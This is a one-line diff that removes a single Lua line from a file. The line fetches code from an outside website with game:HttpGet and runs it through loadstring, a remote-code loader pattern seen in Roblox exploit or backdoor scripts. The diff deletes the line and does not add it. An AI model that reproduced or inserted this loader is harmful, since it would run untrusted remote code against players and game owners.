@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://k-sense.ml'))()
